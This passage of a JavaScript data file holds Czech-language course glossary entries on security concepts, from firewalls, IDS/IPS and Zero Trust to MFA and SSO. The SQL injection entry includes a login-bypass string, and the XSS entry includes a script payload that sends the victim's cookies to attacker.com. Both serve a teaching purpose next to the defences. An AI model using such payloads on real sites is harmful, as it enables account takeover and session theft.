<p>Generace firewallů: <em>Packet filtering</em> (1. gen.) — filtruje dle IP adresy, portu a protokolu bez kontextu. <em>Stateful Inspection</em> (2. gen.) — sleduje stav TCP spojení, povoluje pouze legitimní pakety v rámci navázaných relací. <em>Application Layer / Proxy Firewall</em> (3. gen.) — rozumí aplikačním protokolům (HTTP, FTP, DNS), deep packet inspection. <em>NGFW</em> (Next-Generation Firewall, 4. gen.) — kombinuje stateful inspection s aplikační identifikací, IPS, URL filtrací, SSL/TLS inspekci a uživatelskou identitou.</p>
<p>DMZ (Demilitarized Zone): architektonická síťová zóna oddělující veřejně přístupné servery (webové, emailové, DNS) od interní sítě. Firewall chrání DMZ od Internetu i interní síť od DMZ.</p>
<p>Omezení firewallů v éře <a href="#zero-trust">Zero Trust</a>: tradiční perimetrový model předpokládá, že vnitřní síť je bezpečná. Cloud computing, BYOD a hybridní práce tento předpoklad narušují — proto Zero Trust přistupuje k autentizaci pro každý přístup bez ohledu na umístění.</p>`,
  },
  {
    id: 'ids-ips',
    title: 'IDS/IPS',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['firewall', 'siem', 'soc', 'zero-trust'],
    body: `<p><strong>IDS</strong> (Intrusion Detection System) je systém pro detekci bezpečnostních incidentů a anomálií v síťovém provozu nebo na hostiteli. <strong>IPS</strong> (Intrusion Prevention System) detekci doplňuje o aktivní reakci — blokování podezřelého provozu v reálném čase.</p>
<p>Typy IDS/IPS dle umístění: <em>NIDS/NIPS</em> (Network-based) — analyzuje síťový provoz na strategických bodech sítě (span port na switchi, inline za firewallem). <em>HIDS/HIPS</em> (Host-based) — běží přímo na hostiteli, monitoruje systémová volání, logy, integritu souborů (OSSEC, Wazuh, CrowdStrike). <em>WIDS</em> (Wireless) — detekce útoků na Wi-Fi sítě.</p>
<p>Detekční metody: <em>Signature-based</em> — porovnává provoz s databází známých vzorů útoků (rychlé, spolehlivé pro known threats, nedetekuje zero-day). <em>Anomaly-based</em> — statisticky modeluje "normální" chování a varuje při odchylce (detekuje neznámé útoky, vyšší falešná pozitiva). <em>Behavioral</em> — AI/ML modely chování entit (UEBA).</p>
<p>IDS/IPS generují alertů obrovské množství — bez <a href="#siem">SIEM</a> je správa alertů neudržitelná. Falešná pozitiva (false positives) musí být tuned, aby nezahltila bezpečnostní tým a nezpůsobila "alert fatigue". IPS inline může blokovat legitimní provoz při špatném nastavení.</p>`,
  },
  {
    id: 'vpn',
    title: 'VPN — Virtual Private Network',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['firewall', 'tls', 'kryptografie', 'zero-trust'],
    body: `<p><strong>VPN</strong> (Virtual Private Network) vytváří šifrovaný tunel přes veřejnou síť (Internet), který umožňuje bezpečný vzdálený přístup k podnikové síti nebo anonymizaci internetového provozu. VPN zajišťuje důvěrnost a integritu přenášených dat.</p>
<p>Typy VPN: <em>Remote Access VPN</em> — jednotlivý uživatel se připojuje do podnikové sítě přes VPN klienta (IPsec/IKEv2, OpenVPN, WireGuard). <em>Site-to-Site VPN</em> — propojení dvou vzdálených sítí (poboček) přes Internet, VPN gateway na každé straně. <em>SSL/TLS VPN</em> — přístup přes webový prohlížeč bez instalace klienta (Clientless SSL VPN).</p>
<p>VPN protokoly: <em>IPsec</em> (Internet Protocol Security) — bezpečnostní rozšíření IP protokolu, operuje na L3, standardně pro Site-to-Site. <em>OpenVPN</em> — open-source, TLS-based, flexibilní, portuje na TCP i UDP. <em>WireGuard</em> — moderní, minimalistický, výrazně výkonnější než OpenVPN/IPsec, kratší codebase → menší útočná plocha. <em>L2TP/IPsec</em> — zastaralý, nevhodný bez silného šifrování.</p>
<p>VPN vs. <a href="#zero-trust">Zero Trust</a>: klasická VPN poskytuje přístup k celé síti po autentizaci — kompromitovaný VPN účet = přístup k celé interní síti. Zero Trust nahrazuje VPN principem "never trust, always verify" — granulární přístup jen k konkrétním aplikacím, průběžná autentizace.</p>`,
  },
  {
    id: 'zero-trust',
    title: 'Zero Trust',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['firewall', 'vpn', 'mfa', 'rbac', 'ids-ips', 'siem'],
    body: `<p><strong>Zero Trust</strong> je bezpečnostní architektura a filozofie stojící na principu <em>"Never trust, always verify"</em> — žádná entita (uživatel, zařízení, aplikace) není implicitně důvěryhodná, a to ani uvnitř podnikové sítě. Každý přístup vyžaduje explicitní ověření a autorizaci.</p>
<p>John Kindervag (Forrester, 2010) formuloval tři základní principy Zero Trust: (1) Všechny sítě jsou nebezpečné (i interní), (2) Hrozby jsou všudypřítomné (inside i outside), (3) Lokalita v síti nestačí jako základ důvěry.</p>
<p>Klíčové komponenty Zero Trust architektury: <a href="#mfa">Silná autentizace (MFA)</a> pro každý přístup, mikrosegmentace sítě (granulární pravidla přístupu na úrovni workloadu), <a href="#rbac">RBAC</a> / ABAC (atributová přístupová kontrola), <em>Continuous verification</em> (průběžné ověřování — nová autentizace při změně kontextu), <em>Endpoint verification</em> (zdravotní stav zařízení jako podmínka přístupu), <a href="#ids-ips">UEBA</a> (detekce anomálního chování).</p>
<p>NIST SP 800-207 (Zero Trust Architecture) je referenční publikace pro Zero Trust implementaci. Google BeyondCorp (2010) byl jednou z prvních reálných Zero Trust implementací — vnitřní aplikace přístupné bez VPN na základě zařízení + identity. Zero Trust je klíčovým tématem pro cloud a hybrid work prostředí.</p>`,
  },
  {
    id: 'owasp-top10',
    title: 'OWASP Top 10',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['sql-injection', 'xss', 'zero-trust', 'penetracni-testovani'],
    body: `<p><strong>OWASP Top 10</strong> je pravidelně aktualizovaný seznam deseti nejkritičtějších bezpečnostních rizik webových aplikací vydávaný OWASP (Open Web Application Security Project). Je de facto standardem pro awareness a prioritizaci bezpečnosti webových aplikací. Aktuální verze je z roku 2021.</p>
<p>OWASP Top 10 (2021):</p>
<ol>
  <li><a href="#sql-injection"><strong>A01: Broken Access Control</strong></a> — nesprávná kontrola oprávnění, IDOR, přístup bez autentizace</li>
  <li><strong>A02: Cryptographic Failures</strong> — slabé nebo chybějící šifrování, přenos citlivých dat plaintext</li>
  <li><a href="#sql-injection"><strong>A03: Injection</strong></a> — <a href="#sql-injection">SQL Injection</a>, LDAP Injection, Command Injection, SSTI</li>
  <li><strong>A04: Insecure Design</strong> — chybějící security by design, absence threat modelingu</li>
  <li><strong>A05: Security Misconfiguration</strong> — výchozí hesla, zbytečné feature, verbose error messages</li>
  <li><strong>A06: Vulnerable and Outdated Components</strong> — neaktualizované knihovny, CVE v závislostech</li>
  <li><strong>A07: Identification and Authentication Failures</strong> — slabé heslo politiky, absence MFA, insecure session</li>
  <li><strong>A08: Software and Data Integrity Failures</strong> — supply chain útoky, insecure deserialization</li>
  <li><strong>A09: Security Logging and Monitoring Failures</strong> — absence auditních logů, nedetekované incidenty</li>
  <li><a href="#xss"><strong>A10: Server-Side Request Forgery (SSRF)</strong></a></li>
</ol>`,
  },
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    parentId: 'owasp-top10',
    related: ['owasp-top10', 'xss', 'penetracni-testovani', 'cia-triada'],
    body: `<p><strong>SQL Injection</strong> (SQLi) je útok, při němž útočník vkládá škodlivý SQL kód do vstupního pole aplikace, přičemž aplikace tento kód vykoná jako součást databázového dotazu. Patří mezi nejrozšířenější webové útoky a pravidelně figuruje na vrcholu <a href="#owasp-top10">OWASP Top 10</a>.</p>
<p>Příklad: Přihlašovací formulář s dotazem <code>SELECT * FROM users WHERE username='$user' AND password='$pass'</code>. Útočník zadá username: <code>' OR '1'='1</code> → dotaz se stane: <code>SELECT * FROM users WHERE username='' OR '1'='1' AND password=''</code> → podmínka vždy true → přihlásí se bez hesla.</p>
<p>Typy SQLi: <em>In-band SQLi</em> (Union-based, Error-based) — výsledky přicházejí přímo v odpovědi aplikace. <em>Blind SQLi</em> (Boolean-based, Time-based) — útočník usuzuje na strukturu DB podle chování aplikace (pravda/nepravda, zpoždění odpovědi). <em>Out-of-band SQLi</em> — data jsou exfiltrována mimo aplikaci (DNS, HTTP request na útočníkův server).</p>
<p>Obrana: <em>Prepared statements / Parameterized queries</em> — vstup je vždy předán jako parametr, nikdy není součástí SQL stringu. ORMs (Hibernate, Entity Framework) při správném použití chrání automaticky. Input validation (whitelist), Web Application Firewall (WAF), principle of least privilege pro DB účty aplikace.</p>`,
  },
  {
    id: 'xss',
    title: 'XSS — Cross-Site Scripting',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    parentId: 'owasp-top10',
    related: ['owasp-top10', 'sql-injection', 'penetracni-testovani'],
    body: `<p><strong>XSS</strong> (Cross-Site Scripting) je útok, při němž útočník vkládá škodlivý JavaScript kód do webové stránky, který je následně vykonán v prohlížeči jiného uživatele v kontextu důvěryhodné domény. XSS umožňuje krádež session cookies, phishing, keylogging nebo redirect na malicious site.</p>
<p>Typy XSS: <em>Reflected XSS</em> — škodlivý kód je obsažen v URL parametru, server ho vrací v odpovědi bez sanitizace. Oběť musí kliknout na škodlivý link (zaslaný emailem nebo na phishing stránce). <em>Stored XSS</em> — útočník uloží škodlivý kód do databáze (komentář, zpráva), kód se zobrazí každému, kdo navštíví stránku — nejnebezpečnější varianta. <em>DOM-based XSS</em> — kód je vložen a vykonán přes JavaScript na straně klienta bez nutnosti průchodu serverem.</p>
<p>Příklad Reflected XSS: URL <code>https://example.com/search?q=&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>. Server vrátí: <code>&lt;p&gt;Výsledky pro: &lt;script&gt;…&lt;/script&gt;</code> — prohlížeč vykoná script a odešle cookies útočníkovi.</p>
<p>Obrana: <em>Output encoding</em> — HTML encode všechny výstupy vkládané do HTML (& → &amp;amp;, < → &amp;lt;…). <em>Content Security Policy (CSP)</em> — HTTP hlavička omezující zdroje skriptů. <em>HttpOnly a Secure cookie flags</em> — cookies nelze číst JavaScriptem. <em>Input validation</em> — sanitizace vstupů.</p>`,
  },
  {
    id: 'phishing',
    title: 'Phishing',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['cia-triada', 'mfa', 'siem', 'zero-trust', 'csirt'],
    body: `<p><strong>Phishing</strong> je sociálně-inženýrský útok, při němž útočník klamavou komunikací (e-mail, SMS, volání) manipuluje oběť k prozrazení citlivých informací, kliknutí na škodlivý odkaz nebo stažení malware. Phishing je stále nejčastějším vstupním vektorem kybernetických útoků.</p>
<p>Typy phishingu: <em>Email phishing</em> — masový útok napodobující banky, platformy (Microsoft 365, Google). <em>Spear phishing</em> — cílený útok na konkrétní osobu nebo organizaci, vysoká personalizace. <em>Whaling</em> — spear phishing cílený na vrcholový management (CEO, CFO). <em>Smishing</em> (SMS phishing), <em>Vishing</em> (voice phishing — telefonní hovor). <em>Business Email Compromise (BEC)</em> — kompromitace nebo spoofing e-mailu vedoucího k podvodným platbám.</p>
<p>Techniky phishingu: DNS spoofing, IDN homograph attack (cyrilice/latinka lookalike domény), lookalike domains (arnazon.com), HTTPS phishing (HTTPS nezaručuje legitimitu webu), malicious attachments (macro-enabled Office files, PDF), adversary-in-the-middle (AITM) phishing pro bypass MFA.</p>
<p>Obrana: <a href="#mfa">MFA</a> (omezuje dopad kompromitovaného hesla), security awareness training, email security (SPF, DKIM, DMARC), URL filtering, endpoint protection (EDR), reporting a response mechanismy (<a href="#csirt">CSIRT</a>).</p>`,
  },
  {
    id: 'siem',
    title: 'SIEM',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['soc', 'csirt', 'ids-ips', 'ioc', 'zero-trust'],
    body: `<p><strong>SIEM</strong> (Security Information and Event Management) je centralizovaná platforma pro sběr, normalizaci, korelaci a analýzu bezpečnostních logů a eventů z celého IT prostředí. SIEM je "nervovým centrem" bezpečnostních operací (<a href="#soc">SOC</a>).</p>
<p>Funkce SIEM: <em>Log collection</em> — sběr logů z firewallů, IDS/IPS, OS, aplikací, cloudu. <em>Normalization</em> — překlad různých log formátů do jednotného formátu. <em>Correlation</em> — identifikace vzorců naznačujících útok kombinací eventů z více zdrojů. <em>Alerting</em> — upozornění SOC analytiků na podezřelé aktivity. <em>Threat Intelligence Integration</em> — porovnávání IoC (<a href="#ioc">Indicators of Compromise</a>) s feedem hrozeb. <em>Compliance Reporting</em> — reporty pro SOX, PCI DSS, ISO 27001 audity.</p>
<p>Přední SIEM platformy: Splunk, Microsoft Sentinel, IBM QRadar, Elastic Security, Google Chronicle. Next-gen SIEM integruje SOAR (Security Orchestration, Automation and Response) pro automatizaci response workflow.</p>
<p>Výzvy SIEM: obrovský objem dat, ladění pravidel (rule tuning) pro snížení false positives, high cost (licence + storage), potřeba zkušených SOC analytiků pro interpretaci alertů. Bez správné konfigurace a kvalifikovaného týmu SIEM nepřináší hodnotu.</p>`,
  },
  {
    id: 'soc',
    title: 'SOC — Security Operations Center',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['siem', 'csirt', 'ids-ips', 'ioc', 'penetracni-testovani'],
    body: `<p><strong>SOC</strong> (Security Operations Center) je dedikované centrum pro kontinuální monitoring, detekci, analýzu a reakci na kybernetické incidenty v reálném čase. SOC operuje 24/7/365 a tvoří první linii kybernetické obrany organizace.</p>
<p>Organizace SOC analytika dle úrovní: <em>Tier 1 (Triage)</em> — monitoring alertů ze <a href="#siem">SIEM</a>, první kvalifikace, eskalace. <em>Tier 2 (Incident Responder)</em> — hloubková analýza incidentů, forenzní práce, containment. <em>Tier 3 (Threat Hunter)</em> — proaktivní vyhledávání skrytých hrozeb, advanced analytics, threat intelligence. <em>Security Engineer</em> — správa SOC nástrojů, integrace zdrojů, SIEM tuning.</p>
<p>Typy SOC: <em>In-house SOC</em> — vlastní tým (vysoké náklady, plná kontrola). <em>MSSP</em> (Managed Security Service Provider) — outsourced SOC (nižší náklady, méně kontextu). <em>Hybrid SOC</em> — kombinace vlastního a MSSP.</p>
<p>SOC metriky: MTTD (Mean Time To Detect), MTTR (Mean Time To Respond), počet zpracovaných incidentů, % false positives, SLA na response time. Propojení se <a href="#csirt">CSIRT</a>: SOC detekuje a eskaluje, CSIRT koordinuje response a komunikaci s vnějšími stranami.</p>`,
  },
  {
    id: 'csirt',
    title: 'CSIRT/CERT',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['soc', 'siem', 'nukib', 'ioc'],
    body: `<p><strong>CSIRT</strong> (Computer Security Incident Response Team) nebo <strong>CERT</strong> (Computer Emergency Response Team) je tým specializovaný na koordinaci reakce na kybernetické bezpečnostní incidenty. CSIRT poskytuje centralizované koordinační, analytické a komunikační funkce pro zvládání incidentů.</p>
<p>Role CSIRT: přijímání a triáž nahlášených incidentů, koordinace odpovědi (containment, eradication, recovery), komunikace s postiženými stranami, řídícími orgány a médii, sdílení informací o hrozbách s komunitou (IoC, výstrahy), post-incident analýza a doporučení pro prevenci.</p>
<p>Typy CSIRT: <em>Národní CSIRT</em> — CSIRT.CZ (<a href="#nukib">NÚKIB</a>), CERT-EU (pro EU instituce). <em>Sektorové CSIRT</em> — pro bankovnictví, energetiku, zdravotnictví. <em>Organizační CSIRT</em> — interní tým velké korporace. <em>Koordinační CSIRT</em> — FIRST (Forum of Incident Response and Security Teams) — globální síť CSIRTů.</p>
<p>Mandatorní hlášení incidentů: dle <a href="#zkb">ZKB</a> a <a href="#nis2">NIS2</a> jsou regulované subjekty povinny hlásit závažné incidenty <a href="#nukib">NÚKIB</a> do 24 hodin od zjištění. CSIRT funguje jako kontaktní místo pro tato hlášení a poskytuje zpětnou vazbu a podporu.</p>`,
  },
  {
    id: 'cve-cvss',
    title: 'CVE/CVSS',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['penetracni-testovani', 'ids-ips', 'siem', 'ioc'],
    body: `<p><strong>CVE</strong> (Common Vulnerabilities and Exposures) je veřejně dostupný katalog konkrétních zranitelností informačních systémů spravovaný MITRE Corporation. Každá zranitelnost dostane unikátní identifikátor ve formátu CVE-YYYY-NNNNN. CVE je základem patch management a vulnerability management procesů.</p>
<p><strong>CVSS</strong> (Common Vulnerability Scoring System) je standardní framework pro skórování závažnosti zranitelností. Aktuální verze CVSS 3.1 (a 4.0) hodnotí zranitelnost ve třech skupinách metrik:</p>
<ul>
  <li><em>Base Metrics</em> (0–10): Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, CIA Impact. Výsledek: None (0), Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0)</li>
  <li><em>Temporal Metrics</em>: upravuje Base Score dle aktuálního stavu zneužitelnosti (dostupný exploit, patch existence)</li>
  <li><em>Environmental Metrics</em>: upravuje dle specifik prostředí organizace (kritičnost aktiva, existující mitigace)</li>
</ul>
<p>NVD (National Vulnerability Database) od NIST rozšiřuje CVE o CVSS skóre a metadata. Organizace využívají CVE/CVSS pro prioritizaci patchů: Critical/High CVE → opravit okamžitě, Medium → opravit v dalším patch cyklu, Low → dle rizikové tolerance.</p>`,
  },
  {
    id: 'penetracni-testovani',
    title: 'Penetrační testování',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['cve-cvss', 'owasp-top10', 'soc', 'ioc', 'stride'],
    body: `<p><strong>Penetrační testování</strong> (pentest) je autorizovaný simulovaný útok na IT systémy, sítě nebo aplikace s cílem identifikovat zranitelnosti, které by mohl využít skutečný útočník. Pentest je aktivní bezpečnostní test — na rozdíl od vulnerability scanneru tester aktivně zkoumá a zneužívá zranitelnosti.</p>
<p>Typy pentestu dle znalostí: <em>Black-box</em> — tester nemá žádné informace o cíli (simuluje externího útočníka). <em>White-box</em> — tester má kompletní dokumentaci, zdrojový kód, přístupy (nejefektivnější, nejlevnější). <em>Grey-box</em> — tester má částečné informace (user account, architektura). Dle rozsahu: network pentest, web application pentest, social engineering pentest, physical pentest, red team engagement.</p>
<p>Metodologie pentestingu: PTES (Penetration Testing Execution Standard), OWASP Testing Guide (pro web aplikace), NIST SP 800-115. Fáze: Reconnaissance → Scanning → Gaining Access (exploitation) → Maintaining Access → Reporting.</p>
<p>Výstupem pentestingu je <em>penetration test report</em>: Executive Summary (pro management), Technical Findings (zranitelnosti s CVSS skóre, proof-of-concept, evidence), Risk Rating, Remediation Recommendations, Retest výsledky. TLPT (Threat-Led Penetration Testing) dle <a href="#dora">DORA</a> je pokročilá forma red team testu pro finanční instituce.</p>`,
  },
  {
    id: 'mfa',
    title: 'MFA — Multi-Factor Authentication',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['rbac', 'pam-security', 'sso', 'zero-trust', 'phishing'],
    body: `<p><strong>MFA</strong> (Multi-Factor Authentication, vícefaktorová autentizace) vyžaduje pro ověření identity kombinaci dvou nebo více nezávislých autentizačních faktorů z různých kategorií. MFA dramaticky snižuje riziko neoprávněného přístupu i v případě kompromitace hesla.</p>
<p>Tři kategorie autentizačních faktorů: <em>Something you know</em> — heslo, PIN, bezpečnostní otázka. <em>Something you have</em> — hardwarový token (YubiKey), mobilní telefon (TOTP app — Google Authenticator, Microsoft Authenticator), smart card. <em>Something you are</em> — biometrika (otisk prstu, obličej, hlas). Čtvrtá kategorie: <em>Somewhere you are</em> — geolokace, IP adresa (kontext, ne samostatný faktor).</p>
<p>TOTP (Time-based One-Time Password) — kód generovaný autentizátorem každých 30 sekund na základě sdíleného tajemství a aktuálního času (RFC 6238). FIDO2/WebAuthn (hardware security keys, passkeys) — phishing-resistant MFA, kryptografické challenge-response bez přenosu tajemství přes síť.</p>
<p>Omezení SMS OTP: SIM swapping, SS7 útoky, AITM phishing může zachytit OTP v reálném čase. FIDO2 a TOTP jsou bezpečnější alternativy. <a href="#nis2">NIS2</a> a <a href="#dora">DORA</a> explicitně vyžadují MFA pro přístup k citlivým systémům. Kombinace MFA + <a href="#zero-trust">Zero Trust</a> poskytuje robustní kontrolu přístupu.</p>`,
  },
  {
    id: 'rbac',
    title: 'RBAC — Role-Based Access Control',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['sod', 'mfa', 'pam-security', 'sso', 'zero-trust'],
    body: `<p><strong>RBAC</strong> (Role-Based Access Control) je model řízení přístupu, ve kterém jsou oprávnění (permissions) přiřazena rolím (not directly users), a uživatelé jsou přiřazeni k rolím. Tím se zjednodušuje správa přístupu ve velkých organizacích a umožňuje enforcement <a href="#sod">Segregation of Duties</a>.</p>
<p>Základní koncepty RBAC: <em>Uživatel</em> → <em>Role</em> → <em>Oprávnění</em>. Role je pojmenovaná kolekce oprávnění odpovídající pracovní funkci (Accountant, System Admin, Auditor). Uživatel může mít více rolí. Oprávnění jsou přiřazena rolím, nikoliv přímo uživatelům — změna role automaticky mění oprávnění všech jejích členů.</p>
<p>RBAC modely (NIST): RBAC0 (core RBAC — základní model), RBAC1 (hierarchical RBAC — role hierarchy, inheritance), RBAC2 (constrained RBAC — SOD constraints, cardinality constraints), RBAC3 (kombinace). V praxi nejčastěji RBAC1 nebo RBAC2.</p>
<p>RBAC v ERP: autorizační objekty definují transakce a pole, role je kolekce autorizačních objektů, profil je kompilovaná sada oprávnění. ERP GRC Access Control automatizuje request/approval workflow pro role a detekuje SOD konflikty.</p>
<p>Alternativy: ABAC (Attribute-Based Access Control) — flexibilnější, pravidla na základě atributů (oddělení, projekt, lokace, čas), vhodné pro Zero Trust. PBAC (Policy-Based) — kombinace RBAC a ABAC.</p>`,
  },
  {
    id: 'pam-security',
    title: 'PAM — Privileged Access Management',
    area: 'Bezpečnost',
    subjects: ['4SA313', '4SA515'],
    related: ['rbac', 'mfa', 'sod', 'zero-trust', 'gitc'],
    body: `<p><strong>PAM</strong> (Privileged Access Management) je sada procesů, politik a technologií pro správu, monitoring a auditování přístupu privilegovaných účtů (admin, root, DBA, SA, servisní účty). Privilegované účty jsou nejcennějším cílem útočníků — jejich kompromitace poskytuje neomezený přístup k systémům.</p>
<p>Privilegované účty zahrnují: lokální admin účty, doménové admin účty (AD), databázové admin účty (DBA, sa), síťové zařízení účty, service accounts a API klíče, emergency accounts (break-glass). Tyto účty typicky obcházejí standardní bezpečnostní kontroly a mají přístup k citlivým datům a konfiguraci.</p>
<p>Klíčové funkce PAM řešení: <em>Password Vault / Credential Manager</em> — bezpečné ukládání a rotace privilegovaných hesel (CyberArk, BeyondTrust, Thycotic). <em>Session Recording</em> — záznam všech privilegovaných relací pro audit a forenzní analýzu. <em>Just-In-Time (JIT) Access</em> — dočasné udělení privilegovaného přístupu pouze na dobu nezbytně nutnou. <em>Least Privilege Enforcement</em> — omezení na minimální potřebná oprávnění.</p>
<p>PAM je klíčová pro <a href="#gitc">GITC</a> a <a href="#sox">SOX</a> compliance — privilegované přístupy musí být monitorovány a auditovány. <a href="#nis2">NIS2</a> a <a href="#dora">DORA</a> vyžadují PAM jako součást řízení přístupu k kritickým systémům.</p>`,
  },
  {
    id: 'sso',
    title: 'SSO — Single Sign-On',
    area: 'Bezpečnost',
    subjects: ['4SA313'],
    related: ['mfa', 'rbac', 'pam-security', 'zero-trust'],
    body: `<p><strong>SSO</strong> (Single Sign-On) je autentizační mechanismus, který umožňuje uživateli přihlásit se jednou a automaticky získat přístup k více aplikacím bez nutnosti opakovaného zadávání přihlašovacích údajů. SSO zlepšuje uživatelský komfort a bezpečnost (méně hesel = méně slabých hesel).</p>
<p>Technické standardy pro SSO: <em>SAML 2.0</em> (Security Assertion Markup Language) — XML-based standard pro výměnu autentizačních a autorizačních dat mezi IdP (Identity Provider) a SP (Service Provider). Typicky pro enterprise aplikace. <em>OAuth 2.0</em> — autorizační framework pro delegovaný přístup (třetí strany přistupují k API jménem uživatele bez znalosti hesla). <em>OIDC</em> (OpenID Connect) — autentizační vrstva nad OAuth 2.0. <em>Kerberos</em> — ticket-based protokol v Active Directory prostředí.</p>
<p>Architektura SSO: <em>IdP</em> (Identity Provider — Microsoft Entra ID/AAD, Okta, Ping Identity) je centrální autentizační autorita. Aplikace důvěřují IdP a přijímají autentizační tokeny (SAML assertions, JWT tokens).</p>
<p>Bezpečnostní úvahy SSO: SSO je single point of failure a single point of attack — kompromitace IdP = přístup ke všem aplikacím. Proto musí být SSO doplněno silnou <a href="#mfa">MFA</a> a robustním PAM pro IdP administrátory. Federace identit umožňuje SSO přes organizační hranice (B2B, cloud services).</p>`,
  },
]
